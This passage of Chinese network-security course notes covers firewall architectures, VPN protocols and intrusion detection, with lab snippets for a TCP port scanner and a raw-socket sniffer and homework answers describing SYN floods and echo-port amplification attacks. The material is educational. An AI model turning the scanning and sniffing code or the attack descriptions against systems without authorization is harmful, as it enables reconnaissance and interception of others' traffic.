双重宿主主机防火墙</h4><p><strong>原理</strong>：</p><ul><li><p>双重宿主主机至少有两个网络接口，位于内部网络和外部网络之间。双宿主机防火墙体系禁止网络层的转发功能，完全阻止了内外网络之间的IP层通信。</p></li><li><p>网络间的通信可通过应用层数据共享或应用层代理服务实现。</p></li><li><p>双宿主机的服务方式：用户直接登录到双重宿主主机上；在双重宿主主机上运行代理服务器。</p><ul><li>第一种方式，要在双宿主机上开许多帐号，不安全。</li><li>第二种方式，要在双宿主机上运行各种代理服务器，要访问外部站点时，必须先经过代理服务器认证，才可以通过代理访问因特网。如HTTP，SMTP这些存储转发型服务很适合于进行代理。</li></ul></li></ul><p><strong>优点</strong>：</p><ul><li>节约IP地址</li><li>缓存，加快速度</li><li>安全可靠</li><li>过滤</li><li>日志</li></ul><p><strong>缺点</strong>：</p><ul><li><p>灵活性差</p></li><li><p>对主机的依赖性高</p></li></ul><h4 id="4-2-1-3-屏蔽主机防火墙"><a href="#4-2-1-3-屏蔽主机防火墙" class="headerlink" title="* 4.2.1.3 屏蔽主机防火墙"></a>* 4.2.1.3 屏蔽主机防火墙</h4><p><strong>原理</strong>：</p><ul><li><p>屏蔽主机防火墙由包过滤路由器和堡垒主机组成。</p></li><li><p>包过滤路由器配置在内部网和外部网之间，堡垒主机配置在内部网络上。</p></li><li><p>在路由器上进行规则配置，使得外部系统只能访问堡垒主机，到内部系统其他主机的信息全部被阻塞。</p></li><li><p>内部系统是否允许直接访问Internet，或者是要求使用堡垒主机上的代理服务来访问Internet由机构的安全策略来决定。</p></li></ul><p><strong>优点</strong>：</p><ul><li>安全性更高，双重保护：实现了网络层安全（包过滤）和应用层安全（代理服务）</li></ul><p><strong>缺点</strong>：</p><ul><li><p>过滤路由器能否正确配置是安全与否的关键。</p></li><li><p>过滤路由器的路由表应严格保护，如果遭到破坏，则数据包就不会被路由到堡垒主机上，堡垒主机将被绕过，整个内部网络对侵袭者就是开放的。</p></li></ul><h4 id="4-2-1-4-屏蔽子网防火墙"><a href="#4-2-1-4-屏蔽子网防火墙" class="headerlink" title="* 4.2.1.4 屏蔽子网防火墙"></a>* 4.2.1.4 屏蔽子网防火墙</h4><p><strong>原理</strong>：</p><ul><li><p>用两个包过滤路由器和一个堡垒主机。</p></li><li><p>周边网络是处于Internet和内部网络之间的防护层。包含堡垒主机和一些信息服务器，可能会受到攻击，因此又被称为非军事区网络（DMZ网络）。</p></li><li><p>堡垒主机位于DMZ内，是整个防御体系的核心，可被认为是应用层网关，可以运行各种代理服务程序。</p></li><li><p>屏蔽子网体系结构在本质上与屏蔽主机体系结构一样，但添加了额外的一层保护体系——周边网络。堡垒主机位于周边网络上，周边网络和内部网络被内部过滤路由器分开。</p></li></ul><p><strong>对于进来的信息</strong></p><ul><li><p>外部路由器用于防范通常的外部攻击（如IP欺骗），并管理外部网到DMZ网络的访问，它只允许外部系统访问堡垒主机。</p></li><li><p>内部路由器提供第二层防御，管理DMZ网络到内部网的访问，只接受来自堡垒主机的数据包。</p></li></ul><p><strong>对于出去的信息</strong></p><ul><li><p>内部路由器管理内部网到DMZ网络的访问，它允许内部系统只访问堡垒主机。</p></li><li><p>外部路由器管理DMZ网络到外部网的访问，只接受来自堡垒主机的数据包。</p></li></ul><p><strong>安全性更高</strong></p><ul><li><p>支持网络层和应用层安全功能。</p></li><li><p><strong>DMZ网络的作用</strong>：即使堡垒主机被入侵者控制，也只能侦听周边网络的数据，而不能侦听到内部网的数据。因为内部路由器会阻止内部网络上的数据包流入DMZ网络。</p></li></ul><h3 id="4-2-2-分布式防火墙"><a href="#4-2-2-分布式防火墙" class="headerlink" title="* 4.2.2 分布式防火墙"></a>* 4.2.2 分布式防火墙</h3><p><img data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2021-05-16_13-57-12.png" class="lozad"></p><p><strong>集中式防火墙的缺陷</strong>：</p><ol><li><strong>防外不防内</strong>：传统防火墙一般位于网络的入口处，对于外来的攻击可以有效地抵制，但是对于网络内部的攻击却是无能为力。传统防火墙是基于这样一个假设，即每一个外部用户都是一个潜在的敌人，而内部用户均是可信任的。然而实际环境中，大多数的攻击来自于内部，即使用户是诚实可靠的，一些恶意的病毒，蠕虫代码亦会将诚实的用户变成一个不知情的攻击者。</li><li><strong>瓶颈问题</strong>：防火墙位于网络的接入口，其吞吐量直接影响网络的性能。虽然计算机硬件的处理能力在不断提高，但是更快的网络速度和更复杂的协议相结合产生的效果对防火墙的计算能力提出了严峻的挑战，使得防火墙易成为网络的瓶颈和单点失效点。</li><li><strong>易被绕过</strong>：现在计算机接入网络的方式多种多样，人们可以很轻易地建立一个非授权的接入点。各种隧道技术、无线接入技术和拨号访问都可以绕过防火墙的安全机制。纵然防火墙的策略定义得很完善，对它无法控制的接入也是无可奈何。对于这种网络外部的远程访问，亟需一种行之有效的保护和防范措施。</li><li><strong>端到端的加密对传统防火墙也是一个威胁</strong>：传统防火墙的分组过滤方法需要察看分组包头的信息来进行过滤，防火墙无法从加密的报文中获取其所需的信息。</li><li><strong>策略的制定和维护复杂</strong>：传统防火墙根据网络的拓扑结构制定规则。在大型的网络中，往往有多个接入点和内部防火墙，这使得策略管理非常复杂，一般没有一种通用的管理机制，通常主要依靠网络管理员的能力和经验。</li></ol><p><strong>分布式防火墙的提出</strong>：</p><ul><li>传统防火墙的很多缺陷主要集中在依赖于网络拓扑结构和单一接入控制。</li><li>在这种模式下，策略仍是由一个中心统一定义，而策略的执行却是由各个端结点完成。如此便消除了单一接入点，内网外网的划分并不依赖于网络的拓扑结构，因此内网的定义具有更多的逻辑意义，可以包含局域网内无线接入的用户、拨号用户、通过 VPN 连接的用户，而不仅限于传统意义上某个房间或某栋建筑中的网络。</li><li>相应地，防火墙的策略也不需按照网络拓扑结构来制定访问控制列表，管理员可以更专<br>注于对被保护的对象来制定规则。   </li></ul><p><strong>分布式防火墙解决的问题</strong>：</p><ul><li>这种分布式防火墙最大的优点是防火墙不再受限于拓扑结构，并且将单点防护变成了多点防护，即全民皆兵，从而大大提高了防护能力和数据交换效率。</li><li>同时，分布式防火墙不会再有边界防火墙存在的瓶颈问题，吞吐量不再受防火墙的速率限制，某一点的连接失败不再会隔离整个网络。  </li></ul><h3 id="4-2-3-问题"><a href="#4-2-3-问题" class="headerlink" title="4.2.3 问题"></a>4.2.3 问题</h3><p>所有返回数据包目的IP都是200.0.0.1，防火墙如何识别并送回真正主机？</p><p>1、防火墙记住所有发送包的目的端口；</p><p>2、防火墙记住所有发送包的TCP序列号。</p><h1 id="Ch5-虚拟专用网技术"><a href="#Ch5-虚拟专用网技术" class="headerlink" title="Ch5 虚拟专用网技术"></a>Ch5 虚拟专用网技术</h1><h2 id="5-1-Remote-access-VPN：PPTP-L2TP"><a href="#5-1-Remote-access-VPN：PPTP-L2TP" class="headerlink" title="* 5.1 Remote access VPN：PPTP/L2TP"></a>* 5.1 Remote access VPN：PPTP/L2TP</h2><p>远程访问VPN：在公司总部和远地雇员之间建立VPN</p><p>二层隧道协议：L2F/L2TP 、PPTP</p><p><img data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2021-05-16_14-51-04.png" class="lozad"></p><p><img data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2021-05-16_14-52-08.png" class="lozad"></p><h2 id="5-2-Intranet-VPN：IPSec"><a href="#5-2-Intranet-VPN：IPSec" class="headerlink" title="* 5.2 Intranet VPN：IPSec"></a>* 5.2 Intranet VPN：IPSec</h2><p>内部网VPN：在公司总部和它的分支机构之间建立VPN</p><p>三层隧道协议：GRE、IPSec</p><p><img data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2021-05-16_14-52-57.png" class="lozad"></p><p><strong>IPSec体系结构</strong>：</p><ul><li><p>IPSec不是某种特殊的加密算法或认证算法，也没有在它的数据结构中指定某种特殊的加密算法或认证算法</p></li><li><p>IPSec是开放的框架结构，定义在IP数据包格式中，为目前流行的数据加密或认证的实现提供数据结构，为这些算法的实现提供统一的体系结构</p></li><li><p>有利于数据安全方面的措施进一步发展和标准化</p></li><li><p>不同的加密算法都可以利用IPSec定义的体系结构在网络数据传输过程中实施</p></li><li><p>IPSec（IP Security）：IETF IPsec工作组制定。设计目标是在IPv4和IPv6环境中为网络层流量提供灵活的安全服务。</p></li><li><p>IPSec协议提供的安全服务包括：<strong>访问控制、无连接完整性、数据源鉴别、重放攻击保护、机密性、有限的流量保密等。</strong></p></li><li><p>IPSec包括<strong>安全协议部分</strong>(定义对通信的安全保护机制)和<strong>密钥协商部分</strong>（定义如何为安全协议协商安全参数、对通信实体的身份进行鉴别）</p></li><li><p>IPSec安全协议部分：</p><ul><li>ESP机制为通信提供机密性、完整性保护；</li><li>AH机制为通信提供完整性保护</li><li>ESP和AH机制都能为通信提供重放攻击保护</li></ul></li><li><p>IPSec密钥协商部分</p><ul><li>使用IKE(Internet Key Exchange)协议实现安全协议的自动安全参数协商。安全参数包括加密及鉴别算法、加密及鉴别密钥、通信的保护模式(传输或隧道模式)、密钥的生存期等。</li></ul></li><li><p>封装安全有效载荷（ESP）</p><ul><li><p>Encapsulation security payload</p></li><li><p>确保IP数据包的机密性、数据的完整性以及数据源的身份验证</p></li><li><p>覆盖了为了包加密（可选身份验证）与ESP的使用相关的包格式和常规问题</p></li></ul></li><li><p>验证头（AH）</p><ul><li><p>Authentication Header</p></li><li><p>包含使用AH进行包身份验证相关的包格式和一般问题</p></li></ul></li><li><p>加密算法：描述各种加密算法如何用于ESP中</p></li><li><p>验证算法：描述各种身份验证算法如何用于AH中和ESP身份验证选项</p></li></ul><p><strong>IPSec协议存在问题</strong>：</p><ol><li><p>IKE协议的安全性；</p></li><li><p>与现有网络机制的兼容性；</p></li><li><p>缺乏对远程拨号接入的支持；</p></li><li><p>不支持组播、多协议</p></li></ol><p><strong>对IPSec的总体评价</strong>：</p><ul><li><p><strong>优点</strong></p><ul><li>安全性明显优于其它隧道协议</li></ul></li><li><p><strong>缺点</strong></p><ul><li>过于复杂</li><li>存在安全漏洞</li><li>安全性分析困难</li></ul></li><li><p><strong>根本的解决方案</strong>：</p><ul><li>IPSec修补不能解决根本问题，必须彻底改变制定IPSec的委员会模式。</li></ul></li></ul><p><strong>几种隧道技术比较</strong>：</p><ul><li><p><strong>应用范围</strong>：</p><ul><li><p>PPTP、L2TP：主要用在远程客户机访问局域网方案中；</p></li><li><p>IPSec：主要用在网关到网关或主机方案中，不支持远程拨号访问。</p></li></ul></li><li><p><strong>安全性</strong>：</p><ul><li>PPTP提供认证和加密功能，但安全强度低</li><li>L2TP提供认证和对控制报文的加密，但不能对传输中的数据加密。</li><li>IPSec提供了完整的安全解决方案。</li></ul></li></ul><h2 id="5-3-Extranet-VPN：Socks-v5"><a href="#5-3-Extranet-VPN：Socks-v5" class="headerlink" title="* 5.3 Extranet VPN：Socks v5"></a>* 5.3 Extranet VPN：Socks v5</h2><p>外连网VPN：在公司与商业伙伴、顾客、供应商、投资者之间建立VPN</p><p><img data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2021-05-16_15-21-04.png" class="lozad"></p><ol><li>应用客户端向SOCKS v5服务器发送一个认证方法列表，里面包含了它所支持的所有认证方法；SOCKS v5服务器检查服务器安全策略，如果客户端提供的认证方法列表中有适合服务器已经定义好的安全策略的方法，SOCKS 服务器选择一个认证方法；如果没有，放弃本次通信</li><li>SOCKS服务器选择好一个认证方法后，它发送给客户端一个应答说明它选择了哪一个方法和客户端进行认证，应用客户端和SOCKS服务器之间的认证过程开始</li><li>认证结束后，应用客户端发送请求给SOCKS服务器，请求中包含了客户端想要连结的应用服务器的地址和端口</li><li>SOCKS服务器开始发送请求给客户请求的应用服务器。如果使用的是TCP的话，SOCKS 服务器和应用服务器进行通信并且在应用客户端和应用服务器之间建立一条代理电路。代理电路建立之后，SOCKS服务器将会通知应用客户端</li><li>随着代理电路的建立，应用客户端和应用服务器端开始进行通信。SOCKS服务器截获每一次来自客户端和应用服务器端的数据并且在它们之间进行数据的转发</li></ol><p><strong>缺点</strong>：</p><ul><li><p><strong>冗余的安全</strong></p><ul><li>每个层次进行加密处理</li></ul></li><li><p><strong>不支持ICMP报文转发</strong></p><ul><li>SOCKS协议将不支持ICMP报文的转发：</li><li>“Ping” 将不会通过SOCKS防火墙工作</li><li>错误的状态将不会被广播给正在执行的应用程序</li><li>防火墙将SOCKS和其他的安全特性结合起来使用，增加了一个“ICMP代理”来透明的传递Ping（或其它的ICMP报文）消息</li></ul></li><li><strong>不支持多路广播</strong><ul><li>不支持IP/UDP多路广播。IP多路广播技术在一台主机加入或者离开一个“多点传送地址组”的时候使用Internet组管理协议（IGMP：位于网络层）发出通知。解决方法：创建一个真正的多点广播代理，用它作为一个多点广播通信的特别通道。</li></ul></li></ul><h1 id="Ch6-入侵检测技术"><a href="#Ch6-入侵检测技术" class="headerlink" title="Ch6 入侵检测技术"></a>Ch6 入侵检测技术</h1><ul><li>入侵检测是指对入侵行为的发觉。通过在计算机网络或系统中的若干关键点收集信息并进行分析，判断网络或系统中是否有违反安全策略的行为和被攻击的迹象。</li><li>入侵检测系统(IDS, Intrusion Detection System)，是完成入侵检测功能的软件、硬件及其组合，试图检测、识别和隔离“入侵”企图或计算机的不恰当未授权使用。 </li></ul><h2 id="6-1-基于主机的入侵检测系统"><a href="#6-1-基于主机的入侵检测系统" class="headerlink" title="* 6.1 基于主机的入侵检测系统"></a>* 6.1 基于主机的入侵检测系统</h2><p>监视并分析主机的审计记录和日志文件。</p><p><strong>检测内容</strong>：系统调用、端口调用、系统日志、安全审记、应用日志</p><p><strong>特点</strong>：</p><ul><li><p>视野集中</p></li><li><p>易于用户自定义</p></li><li><p>保护更加周密</p></li><li><p>对网络流量不敏感 </p></li></ul><h2 id="6-2-基于网络的入侵检测系统"><a href="#6-2-基于网络的入侵检测系统" class="headerlink" title="* 6.2 基于网络的入侵检测系统"></a>* 6.2 基于网络的入侵检测系统</h2><p>通过网络适配器或其他特殊硬件监视并分析所有原始网络包。</p><p><strong>检测内容</strong>：包头信息+有效数据部分（数据包=包头信息+有效数据部分）</p><p><strong>优点</strong></p><ul><li><p>在共享网段上对通信数据进行侦听采集数据</p></li><li><p>主机资源消耗少</p></li><li><p>提供对网络通用的保护</p></li></ul><p><strong>存在问题</strong></p><ul><li><p>如何适应高速网络环境</p></li><li><p>非共享网络上如何采集数据</p></li></ul><h2 id="6-3-基于应用的入侵检测系统"><a href="#6-3-基于应用的入侵检测系统" class="headerlink" title="6.3 基于应用的入侵检测系统"></a>6.3 基于应用的入侵检测系统</h2><p>基于主机入侵检测系统的特例。用监控传感器监控某软件应用程序的日志文件。</p><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><h2 id="1-scanner"><a href="#1-scanner" class="headerlink" title="* 1 scanner"></a>* 1 scanner</h2><h3 id="1-1-思路"><a href="#1-1-思路" class="headerlink" title="1.1 思路"></a>1.1 思路</h3><p>采用TCP Connect方式扫描，如果能与目标端口成功建立连接则目标端口开放。</p><h3 id="1-2-关键接口调用"><a href="#1-2-关键接口调用" class="headerlink" title="1.2 关键接口调用"></a>1.2 关键接口调用</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> net = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);<span class="comment">//创建socket标识符</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sa</span>;</span></span><br><span class="line"><span class="keyword">int</span> err = connect(net, (struct sockaddr *)&amp;sa, <span class="keyword">sizeof</span>(sa));<span class="comment">//建立连接</span></span><br></pre></td></tr></table></figure><h2 id="2-sniffer"><a href="#2-sniffer" class="headerlink" title="* 2 sniffer"></a>* 2 sniffer</h2><h3 id="2-1-思路"><a href="#2-1-思路" class="headerlink" title="2.1 思路"></a>2.1 思路</h3><p><img data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/QQ图片20210516164728.png" class="lozad"></p><p>采用RAW SOCKET方式获取二层数据包，随后拆开数据链路层输出双方mac地址，并将payload传入下一层拆包拆出IP头和IP层payload。随后根据IP头中解析出来的Protocol选择合适的协议解析过程进行具体的解析。</p><h3 id="2-2-关键接口调用"><a href="#2-2-关键接口调用" class="headerlink" title="2.2 关键接口调用"></a>2.2 关键接口调用</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> sr = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));  <span class="comment">//创建socket标识符</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *buffer = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">2048</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">saddr</span>;</span></span><br><span class="line"><span class="keyword">int</span> saddr_size = <span class="keyword">sizeof</span>(saddr);</span><br><span class="line">recvfrom(sr, buffer, <span class="number">2048</span>, <span class="number">0</span>, &amp;saddr, (<span class="keyword">socklen_t</span> *)&amp;saddr_size);<span class="comment">//获取数据链路层数据包</span></span><br><span class="line"><span class="comment">/* 获取MAX首部 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ether_header</span> *<span class="title">ethhdr</span> = (<span class="title">struct</span> <span class="title">ether_header</span> *)<span class="title">buffer</span>;</span><span class="comment">//具体操作看结构体</span></span><br><span class="line"><span class="comment">/* 获取IP首部 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">iph</span> = (<span class="title">struct</span> <span class="title">iphdr</span> *)<span class="title">buffer</span>;</span><span class="comment">//具体操作看结构体</span></span><br><span class="line"><span class="comment">/* 获取TCP首部 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">iph</span> = (<span class="title">struct</span> <span class="title">iphdr</span> *)<span class="title">buffer</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> short iphdrlen = iph-&gt;ihl * <span class="number">4</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> *<span class="title">tcph</span> = (<span class="title">struct</span> <span class="title">tcphdr</span> *)(<span class="title">buffer</span> + <span class="title">iphdrlen</span>);</span><span class="comment">//具体操作看结构体</span></span><br><span class="line"><span class="comment">/* 获取UDP首部 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">iph</span> = (<span class="title">struct</span> <span class="title">iphdr</span> *)<span class="title">buffer</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> short iphdrlen = iph-&gt;ihl * <span class="number">4</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">udphdr</span> *<span class="title">udph</span> = (<span class="title">struct</span> <span class="title">udphdr</span> *)(<span class="title">buffer</span> + <span class="title">iphdrlen</span>);</span><span class="comment">//具体操作看结构体</span></span><br></pre></td></tr></table></figure><h1 id="Part-2-课后习题"><a href="#Part-2-课后习题" class="headerlink" title="Part 2 课后习题"></a><center><font color="#DC143C">Part 2 课后习题</font></center></h1><h1 id="第1章-网络安全基础"><a href="#第1章-网络安全基础" class="headerlink" title="第1章 网络安全基础"></a>第1章 网络安全基础</h1><h2 id="1-1-什么是网络体系结构？比较ISO-OSI和TCP-IP这两个标准。"><a href="#1-1-什么是网络体系结构？比较ISO-OSI和TCP-IP这两个标准。" class="headerlink" title="1.1 什么是网络体系结构？比较ISO/OSI和TCP/IP这两个标准。"></a>1.1 什么是网络体系结构？比较ISO/OSI和TCP/IP这两个标准。</h2><p>网络体系结构是指通信系统的整体设计，它为网络硬件、软件、协议、存取控制和拓扑提供标准。</p><p>比较两种标准：</p><ol><li><strong>定义</strong>：OSI（Open System Interconnect），即开放式系统互连，一般都叫OSI参考模型，是ISO组织在1985年研究的网络互连模型。TCP/IP（Transmission Control Protocol/Internet Protocol，传输控制协议/网际协议）是指能够在多个不同网络间实现信息传输的协议簇。</li><li><strong>层次结构</strong>：OSI参考模型与TCP/IP模型都采用了分层体系结构，将庞大而复杂的问题转化为着干个较小且易于处理的子问题。不同的是OSl参考模型划分7层，分别是物理层、数据链路层、网络层、传输层、会话层、表示层和应用层，而TCP/IP参考模型最多划分了5个层次，分别是物理层，数据链路层、网络层、传输层和应用层，将OSI参考模型中的高三层合并为一层统称应用层。有些情况甚至只有三个或四个层次。</li><li><strong>层次关系</strong>：相同之处：都是对等的层间通信；不同之处：TCP/IP参考模型比OSI参考模型层次更清晰简练。</li><li><strong>功能</strong>：在功能上，大致相同，在两个模型中，传输层及以上的各层都是为了通信的进程提供点到点、与网络无关的传输服务；TCP/IP参考模型比OSI参考模型有更好的网络管理功能。</li><li><strong>数据传输原理</strong>：在OSI参考模型中数据的传输和TCP/IP模型原理是完全一样的，只不过OSI参考模型还要加上对表示层和会话层数据单元的封装。</li><li><strong>缺陷</strong>：OSI模型将“服务”与“协议”的定义结合起来，使得参考模型变得格外复杂，使它的实现是困难的。同时，寻址、流控与差错控制在每一层里都重复出现，必然降低系统效率。而TCP/IP在服务、接口与协议的区别上不清楚。一个好的软件工程应该将功能与实现方法区分开来，TCP/IP恰恰没有很好地做到这点，这就使得TCP/IP模型对于使用新技术的指导意义不够。另外，TCP/IP的网络层本身并不是实际的一层，它定义了网络层与数据链路层的接口。物理层与数据链路层的划分是必要和合理的，一个好的参考模型应该将它们区分开来，而TCP/IP参考模型却没有做到这点。</li></ol><h2 id="1-2-路由器是一种常用的网络互联产品，如果某个单位购买了一台路由器，但是该单位没有专业维护人员，于是厂家就通过路由器的内部端口进行远程维护，请讨论这种行为的安全性？并分析其优缺点。"><a href="#1-2-路由器是一种常用的网络互联产品，如果某个单位购买了一台路由器，但是该单位没有专业维护人员，于是厂家就通过路由器的内部端口进行远程维护，请讨论这种行为的安全性？并分析其优缺点。" class="headerlink" title="1.2  路由器是一种常用的网络互联产品，如果某个单位购买了一台路由器，但是该单位没有专业维护人员，于是厂家就通过路由器的内部端口进行远程维护，请讨论这种行为的安全性？并分析其优缺点。"></a>1.2  路由器是一种常用的网络互联产品，如果某个单位购买了一台路由器，但是该单位没有专业维护人员，于是厂家就通过路由器的内部端口进行远程维护，请讨论这种行为的安全性？并分析其优缺点。</h2><p>安全性：不安全。通过路由器的内部端口进行远程维护，会引发一系列问题：一方面可能会遭到网络中的攻击；另一方面该单位的重要信息可能会被厂家窃取。如22端口的ssh远程连接，可以通过爆破/openssh漏洞方式入侵；23端口的Telnet远程连接，可以通过爆破/嗅探/弱口令方式入侵。</p><p>优点：方便快捷，节约维护成本。</p><p>缺点：安全性较差，可能造成信息泄露等安全问题。</p><h2 id="1-3-查阅有关资料，分析TCP-IP网络层、传输层和应用层的安全缺陷。"><a href="#1-3-查阅有关资料，分析TCP-IP网络层、传输层和应用层的安全缺陷。" class="headerlink" title="1.3  查阅有关资料，分析TCP/IP网络层、传输层和应用层的安全缺陷。"></a>1.3  查阅有关资料，分析TCP/IP网络层、传输层和应用层的安全缺陷。</h2><p>网络层：</p><ol><li>网络层协议IP以“尽力传输”作为在网络间转发数据分组的目标，因此IP协议只提供了简单的认证——基于IP地址的认证，并且没有对数据进行任何加密，直接采用明文传输。因此，有很多手段可以针对Internet网络层的缺点进行攻击，包括被动的扫描和各种类型的主动攻击，如IP地址欺骗、碎片攻击、ICMP攻击、路由攻击、ARP攻击。</li></ol><p>传输层：</p><ol><li>TCP 协议：就是通过预测初始序列号来伪造 TCP 包，并且不需要得到回应。这样就可以使攻击者伪装成一台和服务器在同一个局域网上的一台可信任的机器。</li><li>在TCP连接时，首先进行的是三次握手操作。如果发起连接请求的主机（客户端）在发出第一个连接请求的SYN包后突然掉线或者宕机，则被请求端（服务器端）在发出响应这个请求的SYN/ACK包后会因为得不到确认包而处于等待状态，称为半连接握手。在服务器端，通常有一个专门用于处理这种半连接的缓存（堆栈），所有未完成握手的连接会在缓存中排队，服务器端会不断重新尝试着发出SYN/ACK包，只有在等待一段时间后仍然得不到客户端的确认包，服务器才关闭这个连接。如果在短时间内大量出现这样的半连接握手，服务器就会忙于应付而无法响应正常的SYN请求，当这种半连接足够多时，服务器会因为堆栈溢出而崩溃。</li><li>TCP传输的可靠性依赖于三次握手所实现的事先连接和收发双方不断的相互确认。如果在规定时间内没有收到确认数据包，那么原先传输的数据包为被重新传输。如果攻击者通过某种方法使得目标主机无法收到通信对方的确认数据包，那么目标主机会一直不断重新发出数据包，并一直等待，直到资源耗尽而崩溃。</li><li>在很多操作系统中，为了方便测试而开放了7号端口（echo）和19号端口（ chargen ）。7号端口会将收到的字符一字不差的送回去，如果其中遇到回车符号，则会双倍返还。攻击者首先构造一个目标端口号为7的UDP包，将其封装在一个源地址为目标主机、目标地址是目标主机所在网络的广播地址的IP包内并将其发出。目标网络路由器接收到这样的广播包后会向网络中的所有主机都转发这个数据包，因为目标端口是7号端口，因此所有收到广播报文的主机都会向目标主机发出回送报文，只要目标网络内主机数量足够多，就可以很快淹没目标主机，从而达到攻击的目的。</li></ol><p>应用层：</p><ol><li>用于实现网络设备名字到IP地址映射的网络服务的DNS，可能遭受DNS攻击，将用户引向攻击者指定的主机。</li><li>电子邮件系统中存在诸多安全漏洞，比如Hotmail Service漏洞、sendmail漏洞等。</li><li>远程登录协议(Telnet)，可以通过爆破/嗅探/弱口令方式入侵。</li><li>ssh远程连接，可以通过爆破/openssh漏洞方式入侵</li></ol><h2 id="1-4-在计算机网络安全特征中，如何保证用户的真实性？"><a href="#1-4-在计算机网络安全特征中，如何保证用户的真实性？" class="headerlink" title="1.4  在计算机网络安全特征中，如何保证用户的真实性？"></a>1.4  在计算机网络安全特征中，如何保证用户的真实性？</h2><ol><li><strong>数字签名</strong>：保障信息的真实性，保证信息的不可否认性。</li><li><strong>公证</strong>：请求网络管理或者中介机构证明信息来源者身份的真实性。</li><li><strong>身份识别与确认</strong>：用户和密码、验证用户的手机号码、求用户提交身份证的正反面、要求用户提供手持身份证照片、对用户进行视频验证、生物特征识别技术等。</li></ol><h2 id="1-5-TCP-IP存在各种安全问题，为什么还是目前使用的主流标准呢？"><a href="#1-5-TCP-IP存在各种安全问题，为什么还是目前使用的主流标准呢？" class="headerlink" title="1.5  TCP/IP存在各种安全问题，为什么还是目前使用的主流标准呢？"></a>1.5  TCP/IP存在各种安全问题，为什么还是目前使用的主流标准呢？</h2><p>　　TCP/IP刚开始出现时，主要在大学、研究所和政府机构使用，设计者认为大家都是君子，因此对网络安全方面考虑较少。随着Internet的快速发展，越来越多的人开始使用TCP/IP。TCP/IP的用户数量非常庞大，事实上已成为通用的工业标准，而且目前又不能设计出一种全新的协议来取代TCP/IP，因此TCP/IP还是目前使用的主流标准。</p><p>　　当然，为解决TCP/IP存在的安全问题，在各个层次加上相应的安全协议。</p><h2 id="1-6-简要概述“棱镜门”事件折射出的我国目前网络安全面临的主要威胁。"><a href="#1-6-简要概述“棱镜门”事件折射出的我国目前网络安全面临的主要威胁。" class="headerlink" title="1.6  简要概述“棱镜门”事件折射出的我国目前网络安全面临的主要威胁。"></a>1.6  简要概述“棱镜门”事件折射出的我国目前网络安全面临的主要威胁。</h2><ol><li><strong>源于国家层面的威胁</strong>：随着信息技术的发展，国家以及政治阵营间的竞争和对抗已从既有的军事、经济竞争和意识形态渗透延伸至网络信息对抗与防御，从而产生了国家间的震慑与威胁。其中最具代表性的当属美国。美国网络安全体系中所包含的中央情报局、国家安全局和国土安全部扮演了网络信息防御、渗透和打击的核心角色。目前，在全球范围内仅有美国提出了主动就进行网络攻击的战略部署，在其国家安全局领导下的网络作战部队无论在规模、防御和攻击能力还是技术水平方面都是其他各国难以抗衡的。作为全球范围内最大的情报组织，美国中央情报局在全球诸多国家和地区已秘密开展各项渗透工作。</li><li><strong>恐怖组织的威胁</strong>：美国“9*11”恐怖袭击事件之后，恐怖组织以及极端宗教、民族分裂三股势力发展迅猛。这三股势力已开始利用网络技术和手段进行各种鼓吹和发展活动。不仅如此，利用网络系统的漏洞对各国重点行业关键信息系统和基础设施进行网络攻击已成为近年来这三股势力进行破坏和恐怖活动的新型手段。恐怖活动的网络化不仅是我国面临的重要网络安全威胁，也已成为全球各国开展反恐工作的重点关注对象。</li><li><strong>经济犯罪的威胁</strong>：随着信息技术在金融服务中的广泛应用，许多跨国犯罪团伙和组织利用普通民众网络安全意识淡薄的特点预谋、策划以及实施的网络诈骗和电信诈骗案件一直持续增加。 通过对国内破获的网络诈骗案件的分析可知金融服务系统的安全漏洞是犯罪分子寻找可乘之机的主要根源。 安全漏洞具有不可完全消除的特性。随着金融信息服务的日益普及，网络经济犯罪的可乘之机也日益增加，所造成的危害和影响也随之逐渐增大。</li><li><strong>黑客团体的威胁</strong>：黑客团体在网络空间安全方面所造成的威胁也已日益增强。他们大多打着反对全球化、参与国际热点政治事件、鼓吹“无政府主义”和宣扬极端思潮的旗号在全球范围内进行网络攻击。 